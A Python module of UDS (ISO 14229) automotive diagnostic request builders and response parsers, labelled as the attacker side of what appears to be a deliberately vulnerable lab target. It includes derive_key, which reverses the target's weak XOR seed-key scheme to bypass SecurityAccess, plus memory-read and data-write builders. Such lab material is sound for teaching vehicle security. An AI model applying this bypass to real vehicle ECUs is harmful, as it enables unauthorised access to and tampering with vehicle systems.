"""UDS (ISO 14229) request builders and response parsing for the attacker side."""

from __future__ import annotations

# Service IDs.
SID_DSC = 0x10
SID_READ_MEMORY = 0x23
SID_SECURITY_ACCESS = 0x27
SID_TESTER_PRESENT = 0x3E
SID_READ_DID = 0x22
SID_WRITE_DID = 0x2E

NEG_RESPONSE = 0x7F
POS_RESPONSE_BIT = 0x40

# Negative response codes -> human names.
NRC = {
    0x10: "generalReject",
    0x11: "serviceNotSupported",
    0x12: "subFunctionNotSupported",
    0x13: "incorrectMessageLengthOrInvalidFormat",
    0x22: "conditionsNotCorrect",
    0x31: "requestOutOfRange",
    0x33: "securityAccessDenied",
    0x35: "invalidKey",
    0x36: "exceedNumberOfAttempts",
    0x37: "requiredTimeDelayNotExpired",
    0x7E: "subFunctionNotSupportedInActiveSession",
    0x7F: "serviceNotSupportedInActiveSession",
}

# The seed->key relation the target uses (deliberately reversible -- see
# docs/VULNERABILITIES.md weakness #2).
SEED_KEY_XOR = 0xA5A5A5A5


class NegativeResponse(Exception):
    def __init__(self, sid: int, nrc: int):
        self.sid = sid
        self.nrc = nrc
        super().__init__(f"NRC {nrc:#04x} ({NRC.get(nrc, 'unknown')}) for SID {sid:#04x}")


# -- request builders --------------------------------------------------------

def diagnostic_session(session: int, suppress: bool = False) -> bytes:
    sub = session | (0x80 if suppress else 0)
    return bytes([SID_DSC, sub])


def tester_present(suppress: bool = True) -> bytes:
    return bytes([SID_TESTER_PRESENT, 0x80 if suppress else 0x00])


def read_did(did: int) -> bytes:
    return bytes([SID_READ_DID, (did >> 8) & 0xFF, did & 0xFF])


def write_did(did: int, data: bytes) -> bytes:
    return bytes([SID_WRITE_DID, (did >> 8) & 0xFF, did & 0xFF]) + bytes(data)


def security_request_seed(level: int = 1) -> bytes:
    return bytes([SID_SECURITY_ACCESS, level])


def security_send_key(level: int, key: int) -> bytes:
    return bytes(
        [SID_SECURITY_ACCESS, level + 1, (key >> 24) & 0xFF, (key >> 16) & 0xFF,
         (key >> 8) & 0xFF, key & 0xFF]
    )


def read_memory(addr: int, size: int, addr_len: int = 1, size_len: int = 1) -> bytes:
    alfid = ((size_len & 0x0F) << 4) | (addr_len & 0x0F)
    out = bytes([SID_READ_MEMORY, alfid])
    out += addr.to_bytes(addr_len, "big")
    out += size.to_bytes(size_len, "big")
    return out


def derive_key(seed: int) -> int:
    """Reverse the target's seed->key transform."""
    return seed ^ SEED_KEY_XOR


# -- response parsing --------------------------------------------------------

def parse(resp: bytes) -> tuple[int, bytes]:
    """Return (service_id, payload) for a positive response, or raise
    NegativeResponse for a 0x7F."""
    if not resp:
        raise ValueError("empty response")
    if resp[0] == NEG_RESPONSE:
        raise NegativeResponse(resp[1], resp[2])
    return resp[0] - POS_RESPONSE_BIT, resp[1:]


def seed_from_response(resp: bytes) -> int:
    sid, payload = parse(resp)
    if sid != SID_SECURITY_ACCESS or len(payload) < 5:
        raise ValueError("not a requestSeed response")
    return int.from_bytes(payload[1:5], "big")
